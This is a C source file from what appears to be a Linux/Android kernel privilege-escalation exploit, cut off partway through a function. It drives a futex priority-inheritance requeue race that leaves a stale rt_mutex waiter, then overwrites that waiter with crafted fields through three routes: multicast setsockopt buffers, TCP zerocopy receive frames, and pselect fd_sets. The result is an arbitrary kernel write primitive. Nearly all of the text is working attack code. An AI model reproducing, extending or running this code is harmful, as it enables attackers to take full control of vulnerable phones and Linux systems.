#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include "target.h"
#include "tcp_zerocopy_route.h"

/* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
 * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
 * move to the stateless time helper module and make the input const. */
static double fops_elapsed_ms(struct timespec *ref) {
  return runtime_elapsed_ms(ref);
}
static const struct execution_settings *execution_settings(void) {
  return target_profile_execution(&g_target_profile);
}
int route_last_step;
int route_last_errno;

/* TODO(decoupling:S11-S13-route-context): Route instances will receive their
 * PiRaceContext explicitly. Until then these aliases expose one owned context. */
#define legacy_consumer_go (g_pi_race_context.consumer_go)
#define legacy_consumer_stop (g_pi_race_context.consumer_stop)
#define legacy_consumer_calls (g_pi_race_context.consumer_calls)
#define legacy_consumer_success (g_pi_race_context.consumer_success)
#define legacy_consumer_inflight (g_pi_race_context.consumer_inflight)
#define legacy_route_delay_usec (g_pi_race_context.route_delay_usec)

/* 5.x kernel route. The multicast option buffer overlaps the stale compact
 * waiter. Profiles opt in with kernel_major=5 and mcast_waiter_off. */
static uint32_t mr_l1, mr_l2, mr_cond;
static pthread_t mr_tx, mr_ty;
static atomic_int mr_y_l2, mr_x_l1, mr_y_wait, mr_x_wait, mr_y_done;
static atomic_int mr_respray, mr_sprayed, mr_stop, mr_x_done, mr_y_tid;
static uintptr_t mr_target, mr_value, mr_lock, mr_task;
static int mr_fd = -1, mr_ready, mr_policy, mr_lock_slot;

/* Decoupling plan: signal hook used only to interrupt the multicast waiter.
 * Input: signal number; output: none. Future: multicast_waiter_interrupt();
 * installation and previous-handler ownership move to MulticastWaiterContext. */
static void mr_intr(int sig) { (void)sig; }
/* Decoupling plan: toggle the resident multicast waiter's scheduler policy.
 * Input: implicit waiter TID/policy; output: syscall result. Future:
 * multicast_waiter_adjust(context), with policy stored in the route context. */
static long mr_adjust(void) {
  struct sched_param sp = {.sched_priority = 0};
  int next = mr_policy == SCHED_NORMAL ? SCHED_BATCH : SCHED_NORMAL;
  long r = syscall(SYS_sched_setscheduler, atomic_load(&mr_y_tid), next, &sp);
  mr_policy = next;
  return r;
}
/* Decoupling plan: encode and submit one multicast overlap buffer. Inputs:
 * profile, target, value, lock, task and socket; output: submission status.
 * Future: multicast_waiter_stamp(context, request), returning structured error. */
static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
  MulticastWaiterLayout layout =
      target_profile_multicast_waiter_layout(&g_target_profile);
  size_t size = layout.buffer_size;
  unsigned char b[size];
  size_t o = layout.waiter_offset;
  memset(b, 0, sizeof(b));
  if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
  put64(b, o + layout.task_offset, mr_task);
  put64(b, o + layout.lock_offset, lock);
  uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
  setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
}
/* Decoupling plan: multicast waiter/respray worker. Input: currently implicit
 * mr_* state; output: completion in atomics. Future:
 * multicast_waiter_worker(void *MulticastWaiterContext), owning its socket. */
static void *mr_y(void *arg) {
  (void)arg; pin_to_core(CONSUMER_CORE);
  sigset_t set; sigemptyset(&set); sigaddset(&set, SIGUSR1);
  pthread_sigmask(SIG_UNBLOCK, &set, NULL);
  atomic_store(&mr_y_tid, syscall(SYS_gettid));
  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&mr_y_l2, 1); while (!atomic_load(&mr_x_l1)) sched_yield();
  atomic_store(&mr_y_wait, 1);
  futex_op(&mr_cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, NULL, &mr_l1, 0);
  mr_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (mr_fd < 0) return NULL;
  mr_stamp(0, 0, mr_lock); atomic_store(&mr_y_done, 1);
  while (!atomic_load(&mr_stop)) {
    if (atomic_exchange(&mr_respray, 0)) {
      MulticastWaiterLayout layout =
          target_profile_multicast_waiter_layout(&g_target_profile);
      uintptr_t lock = mr_lock + layout.lock_slots_offset +
          (mr_lock_slot++ % layout.lock_slot_count) * layout.lock_slot_stride;
      mr_stamp(mr_target, mr_value, lock); atomic_store(&mr_sprayed, 1);
    }
    sched_yield();
  }
  uint32_t dummy = 0x80000000U | (uint32_t)getpid(); struct timespec z = {0,0};
  futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  while (!atomic_load(&mr_x_done)) sched_yield();
  close(mr_fd); mr_fd = -1; return NULL;
}
/* Decoupling plan: multicast owner worker. Input: currently implicit mr_* PI
 * state; output: synchronization flags. Future:
 * multicast_waiter_owner_worker(void *MulticastWaiterContext). */
static void *mr_x(void *arg) {
  (void)arg; pin_to_core(CORE);
  while (!atomic_load(&mr_y_l2)) sched_yield();
  futex_op(&mr_l1, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&mr_x_l1, 1); atomic_store(&mr_x_wait, 1);
  futex_op(&mr_l2, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&mr_l1, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  futex_op(&mr_l2, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
  atomic_store(&mr_x_done, 1); return NULL;
}
/* Decoupling plan: initialize the long-lived multicast writer. Input: profile,
 * addresses and CPUs; output: ready/error status. Future:
 * multicast_waiter_resident_prepare(context, session); kernel version stays in
 * profile comments rather than the symbol name. */
int kernel5_resident_start(void) {
  if (mr_ready) return 1;
  MulticastWaiterLayout layout =
      target_profile_multicast_waiter_layout(&g_target_profile);
  const struct execution_settings *execution = execution_settings();
  uintptr_t bss = resolved_addresses_data_alias(
      &g_resolved_addresses, KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
  mr_lock = bss + layout.fake_lock_offset;
  mr_task = bss + layout.fake_task_offset;
  mr_l1=mr_l2=mr_cond=0; mr_policy=SCHED_NORMAL; mr_lock_slot=0;
  atomic_store(&mr_y_l2,0); atomic_store(&mr_x_l1,0); atomic_store(&mr_y_wait,0);
  atomic_store(&mr_x_wait,0); atomic_store(&mr_y_done,0); atomic_store(&mr_stop,0);
  atomic_store(&mr_x_done,0); atomic_store(&mr_respray,0);
  struct sigaction sa={0}; sa.sa_handler=mr_intr; sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1,&sa,NULL) || pthread_create(&mr_ty,NULL,mr_y,NULL) ||
      pthread_create(&mr_tx,NULL,mr_x,NULL)) return 0;
  struct timespec ready_started;
  clock_gettime(CLOCK_MONOTONIC, &ready_started);
  while (!(atomic_load(&mr_y_l2)&&atomic_load(&mr_x_l1)&&
           atomic_load(&mr_y_wait)&&atomic_load(&mr_x_wait))) {
    if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
      return 0;
    sched_yield();
  }
  usleep(execution->multicast_post_requeue_settle_us); errno=0;
  long r=futex_op(&mr_cond,FUTEX_CMP_REQUEUE_PI_PRIVATE,1,(void*)0,&mr_l1,0);
  mr_cond=1; syscall(SYS_tgkill,getpid(),atomic_load(&mr_y_tid),SIGUSR1);
  if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
  clock_gettime(CLOCK_MONOTONIC, &ready_started);
  while (!atomic_load(&mr_y_done) &&
         fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
    sched_yield();
  if(!atomic_load(&mr_y_done) || mr_adjust()<0) return 0;
  usleep(execution->multicast_post_adjust_settle_us); mr_ready=1;
  pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
  return 1;
}
/* Decoupling plan: execute one resident multicast write. Inputs: context plus
 * target/value; output: route status. Future:
 * multicast_waiter_resident_execute(context, write_request). */
int kernel5_resident_write(uintptr_t target, uintptr_t value) {
  if(!mr_ready) return 0; mr_target=target; mr_value=value;
  atomic_store(&mr_sprayed,0); atomic_store(&mr_respray,1);
  while(!atomic_load(&mr_sprayed)) sched_yield();
  long r=mr_adjust(); pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n",value,target,r);
  return r==0;
}
/* Decoupling plan: disarm and destroy resident multicast resources. Input:
 * route/heap contexts; output: clean/disarmed status. Future: split into
 * multicast_waiter_disarm() and multicast_waiter_destroy(). */
void kernel5_resident_stop(void) {
  if(!mr_ready) return; atomic_store(&mr_stop,1);
  pthread_join(mr_ty,NULL); pthread_join(mr_tx,NULL); mr_ready=0;
  close_reclaim_sockets(); cleanup_page_prepare_state();
  pr_success("5.x resident writer disarmed\n");
}

/* Decoupling plan: execute the one-shot multicast waiter route. Input: route,
 * profile, payload and race contexts; output: RouteStatus. Future:
 * multicast_waiter_execute(); route_last_* becomes the returned status. */
void do_kernel5_fake_lock_route(const WriteRequest *request) {
  (void)request;
  MulticastWaiterLayout layout =
      target_profile_multicast_waiter_layout(&g_target_profile);
  size_t stamp_size = layout.buffer_size;
  size_t waiter_off = layout.waiter_offset;
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  build_multicast_waiter_payload(
      stamp, waiter_off, layout.task_offset,
      layout.lock_offset, fake_task, fake_lock);
  // TODO(decoupling:S13-multicast-context): Future: encoder input comes from
  // MulticastWaiterRouteContext. Input: route-owned layout/payload; output:
  // stamp bytes. Blocked by: route ownership migration in S13.
  uint16_t family = AF_UNSPEC;
  memcpy(stamp + 8, &family, sizeof(family));

  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
  atomic_store(&legacy_consumer_calls, 0); atomic_store(&legacy_consumer_success, 0);
  atomic_store(&legacy_consumer_stop, 0); atomic_store(&legacy_route_delay_usec, 0);
  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
  route_last_step = 61; route_last_errno = errno;
  atomic_store(&legacy_consumer_go, 1);
  for (int spin = 0; spin < 100000000 && atomic_load(&legacy_consumer_calls) == 0; spin++)
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&legacy_consumer_go, 0);
  while (atomic_load(&legacy_consumer_inflight)) __asm__ volatile("yield" ::: "memory");
  close(fd);
  if (ret == 0 || atomic_load(&legacy_consumer_success) > 0) {
    route_last_step = 0; route_last_errno = 0;
  }
}

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

/* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
 * output: consumer idle. */
static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
  atomic_store(&context->race->consumer_go, 0);
  while (atomic_load(&context->race->consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

/* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
 * output: 0/-1 and owned descriptors. Future: tcp_zerocopy_open_pair(context),
 * recording descriptor ownership in TcpZerocopyRouteContext. */
static int tcp_make_pair(TcpZerocopyRouteContext *context) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  context->client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (context->client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(context->client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(context->client_fd);
    context->client_fd = -1;
    close(listener);
    errno = saved;
    return -1;
  }

  context->server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (context->server_fd < 0) {
    close(context->client_fd);
    context->client_fd = -1;
    errno = saved;
    return -1;
  }
  return 0;
}

/* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
 * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  TcpZerocopyRouteContext *context = arg;
  while (!atomic_load(&context->punch_go) &&
         !atomic_load(&context->punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&context->punch_stop)) {
    if (fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
      atomic_store(&context->punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&context->punch_phase, 1);
    if (fallocate(context->punch_fd,
                  FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)context->page_size,
                  context->mapping_length - context->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&context->punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&context->punch_phase, 0);
    if (atomic_load(&context->punch_failed)) {
      break;
    }
  }
  return NULL;
}

static int tcp_zerocopy_fail(TcpZerocopyRouteContext *context,
                             int step, int error_number) {
  context->status.step = step;
  context->status.error_number = error_number;
  route_last_step = step;
  route_last_errno = error_number;
  return -1;
}

/* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
static int tcp_zerocopy_prepare(TcpZerocopyRouteContext *context) {
  if (!page_base || !fake_lock || !fake_fops) {
    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
               page_base, fake_lock, fake_fops);
    return tcp_zerocopy_fail(context, 40, 0);
  }

  if (tcp_make_pair(context) != 0) {
    pr_warning("tcp route pair setup failed errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 41, errno);
  }

  context->page_size = (size_t)sysconf(_SC_PAGESIZE);
  context->punch_fd =
      (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (context->punch_fd < 0 ||
      fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 42, errno);
  }
  context->mapping = mmap(NULL, context->mapping_length,
                          PROT_READ | PROT_WRITE,
                          MAP_SHARED, context->punch_fd, 0);
  if (context->mapping == MAP_FAILED) {
    pr_warning("tcp route mmap errno=%d\n", errno);
    return tcp_zerocopy_fail(context, 43, errno);
  }
  for (size_t off = 0; off < context->mapping_length;
       off += context->page_size) {
    context->mapping[off] = 0x55;
  }

  atomic_store(&context->race->consumer_stop, 0);
  atomic_store(&context->race->consumer_go, 0);
  atomic_store(&context->race->consumer_calls, 0);
  atomic_store(&context->race->consumer_success, 0);
  int thread_error = pthread_create(
      &context->punch_worker, NULL, tcp_punch_thread, context);
  if (thread_error != 0) {
    pr_warning("tcp route punch thread errno=%d\n", thread_error);
    return tcp_zerocopy_fail(context, 44, thread_error);
  }
  context->punch_worker_started = 1;
  return 0;
}

/* Run the route after prepare has established exclusive resource ownership. */
static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
  /* waiter->task carries init_task's phys alias, not the image address */
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  int arm_seq = (int)context->execution->tcp_arm_sequence;
  int post_hold =
      (int)context->execution->tcp_post_receive_hold_iterations;
  int attempts = (int)context->execution->tcp_attempts;

  pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
          page_base, fake_lock, fake_w0, fake_task, waiter_task,
          attempts, arm_seq, post_hold);

  atomic_store(&context->punch_go, 1);
  /* custom-write mode: fire the PI walk immediately */
  atomic_store(&context->race->route_delay_usec, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= attempts && !context->route_won; i++) {
    int calls_before = atomic_load(&context->race->consumer_calls);
    int success_before = atomic_load(&context->race->consumer_success);
    (void)send(context->server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&context->punch_phase)) {
      sched_yield();
    }
    for (int spin = 0;
         !atomic_load(&context->punch_phase) &&
         !atomic_load(&context->punch_failed) &&
         spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&context->punch_failed)) {
      tcp_zerocopy_fail(context, 46,
                        atomic_load(&context->punch_failed));
      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
      break;
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18,
          (uint64_t)(uintptr_t)(context->mapping + context->page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, waiter_task);
    put64(zc, 0x30, fake_lock);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(context->client_fd, IPPROTO_TCP,
                         TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    /* release the consumer only once the zerocopy write landed in the
     * waiter frame; earlier release walks a half-written waiter */
    if (i >= arm_seq && ret == 0) {
      atomic_store(&context->race->consumer_go, i);
      for (int spin = 0; spin < post_hold; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
      tcp_wait_for_consumer_idle(context);
    }

    int calls = atomic_load(&context->race->consumer_calls);
    int success = atomic_load(&context->race->consumer_success);
    if (calls <= calls_before || success <= success_before) {
      if ((i % 100) == 0 || ret != 0) {
        pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                "success=%d\n",
                i, ret, saved_errno, len, calls, success);
      }
      continue;
    }
    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
     * stages verify their own effects; no cfi stage here. */
    context->route_won = 1;
    context->status.code = ROUTE_OK;
    route_last_step = 0;
    route_last_errno = 0;
  }
  if (!context->route_won && context->status.step == 0) {
    tcp_zerocopy_fail(context, 45, 0);
  }
  return context->status;
}

/* Stop every trigger before releasing any descriptor or mapping. */
static void tcp_zerocopy_disarm(TcpZerocopyRouteContext *context) {
  atomic_store(&context->race->consumer_go, 0);
  atomic_store(&context->race->consumer_stop, 1);
  atomic_store(&context->punch_go, 0);
  atomic_store(&context->punch_stop, 1);
  tcp_wait_for_consumer_idle(context);
  context->status.kernel_disarmed = 1;
}

/* Join the owned worker, then release each owned userspace resource once. */
static void tcp_zerocopy_destroy(TcpZerocopyRouteContext *context) {
  if (context->punch_worker_started) {
    int join_error = pthread_join(context->punch_worker, NULL);
    if (join_error != 0) {
      tcp_zerocopy_fail(context, 47, join_error);
      context->status.code = ROUTE_DIRTY_FAILURE;
      pr_warning("tcp route punch join errno=%d; resources retained\n",
                 join_error);
      return;
    }
    context->punch_worker_started = 0;
  }
  if (context->mapping != MAP_FAILED) {
    if (munmap(context->mapping, context->mapping_length) != 0) {
      int saved_errno = errno;
      tcp_zerocopy_fail(context, 48, saved_errno);
      context->status.code = ROUTE_DIRTY_FAILURE;
      pr_warning("tcp route munmap errno=%d\n", saved_errno);
      return;
    }
    context->mapping = MAP_FAILED;
  }
  if (context->punch_fd >= 0) {
    close(context->punch_fd);
    context->punch_fd = -1;
  }
  if (context->server_fd >= 0) {
    close(context->server_fd);
    context->server_fd = -1;
  }
  if (context->client_fd >= 0) {
    close(context->client_fd);
    context->client_fd = -1;
  }
  context->status.userspace_clean = 1;
  if (!context->route_won && context->status.kernel_disarmed) {
    context->status.code = ROUTE_FALLBACK_SAFE;
  }
}

/* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
void do_tcp_fake_lock_route(const WriteRequest *request) {
  TcpZerocopyRouteContext context;
  tcp_zerocopy_route_context_init(
      &context, &g_pi_race_context, request, execution_settings(),
      TCP_PUNCH_SHMEM_LEN);
  route_last_step = 0;
  route_last_errno = 0;

  if (tcp_zerocopy_prepare(&context) == 0) {
    tcp_zerocopy_execute(&context);
  }
  tcp_zerocopy_disarm(&context);
  tcp_zerocopy_destroy(&context);

  pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
          "step=%d errno=%d\n",
          context.route_won,
          atomic_load(&context.race->consumer_calls),
          atomic_load(&context.race->consumer_success), context.status.code,
          context.status.userspace_clean, context.status.kernel_disarmed,
          context.status.step, context.status.error_number);
}

/* Decoupling plan: choose route timing delay. Input: attempt and eventually
 * immutable profile; output: microseconds. Future:
 * select_stack_delay_usec(const TargetProfile *, int). */
static int route_delay_usec(int attempt) {
  (void)attempt;
  /* Both routes: let select/pselect establish its frame and stamp the
   * crafted waiter before the PI walk fires. */
  return (int)execution_settings()->select_enter_delay_us;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

/* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
 * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
static int pselect_waiter_shift(void) {
  SelectStackLayout layout =
      target_profile_select_stack_layout(&g_target_profile);
  // TODO(decoupling:S12-select-context): Future: this layout is owned by
  // SelectStackRouteContext. Input: route context/request; output: fd_sets.
  // Blocked by: route ownership migration in S12.
  return target_profile_is_loaded(&g_target_profile)
             ? layout.waiter_shift
             : PSELECT_WAITER_WORD_SHIFT;
}

/* Decoupling plan: encode a logical waiter word across select fd_sets. Inputs:
 * layout, sets, word/value; output: placement status. Future:
 * select_stack_put_waiter_word(layout, sets, ...), without global profile. */
static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

/* Decoupling plan: materialize descriptors selected by the crafted fd_sets.
 * Inputs: sets and source fds; output: owned duplicated descriptors. Future:
 * select_stack_open_fds(SelectStackRouteContext *, const SelectStackSets *). */
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

/* Decoupling plan: preserve standard descriptors before select-stack setup.
 * Input: route context; output: backup descriptors. Future:
 * select_stack_backup_stdio(SelectStackRouteContext *). */
void reserve_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      standard_io_backup[fd] = backup;
    }
  }
}

/* Decoupling plan: restore standard descriptors from route-owned backups.
 * Input: route context; output: restored/closed state. Future:
 * select_stack_restore_stdio(SelectStackRouteContext *). */
static void restore_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] < 0) continue;
    dup2(standard_io_backup[fd], fd);
  }
}

/* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
 * profile, payload layout and write request; output: three fd_sets. Future:
 * select_stack_build_fdsets(profile, payload, request, result). */
void prepare_pselect_fdsets(
    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  SelectStackLayout layout =
      target_profile_select_stack_layout(&g_target_profile);
  int compact = layout.compact_waiter;

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). Value writes relink
     * left-only at the target, or the erase rebalance walks the target page. */
    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    struct pselect_waiter_word words[] = {
      {2, relink_pc, "tree_pc"},
      {3, 0, "tree_right"},
      {4, request->target, "tree_left"},
      {5, fake_right, "pi_pc"},
      {6, 0, "pi_right"},
      {7, request->target, "pi_left"},
      {8, fake_task, "task"},
      {9, fake_lock, "lock"},
      {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, fake_task, "task"},
      {13, fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  }
}

/* Decoupling plan: prepare, execute and clean the select-stack route. Input:
 * session payload/race state; output: RouteStatus. Future: split into
 * select_stack_prepare/execute/disarm/destroy; dirty failures retain ownership. */
void do_pselect_fake_lock_route(const WriteRequest *request) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  const struct execution_settings *execution = execution_settings();
  int pipefd[2];
  SYSCHK(pipe(pipefd));

  SelectStackLayout layout =
      target_profile_select_stack_layout(&g_target_profile);
  int compact_route = layout.compact_waiter;

  /* Both routes park on a never-ready timerfd: the waiter must stay stale
   * on the pselect stack for the whole consumer window. */
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    route_last_step = 31;
    route_last_errno = errno;
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex, request);
  pr_info("pselect route setup shift=%d page=%016zx "
          "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
          "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
          "ex1=%016llx ex2=%016llx ex3=%016llx\n",
          pselect_waiter_shift(),
          page_base, fake_lock, fake_w0, fake_task,
          (unsigned long long)fdset_get_word(&in, 0),
          (unsigned long long)fdset_get_word(&in, 3),
          (unsigned long long)fdset_get_word(&out, 0),
          (unsigned long long)fdset_get_word(&ex, 0),
          (unsigned long long)fdset_get_word(&ex, 1),
          (unsigned long long)fdset_get_word(&ex, 2),
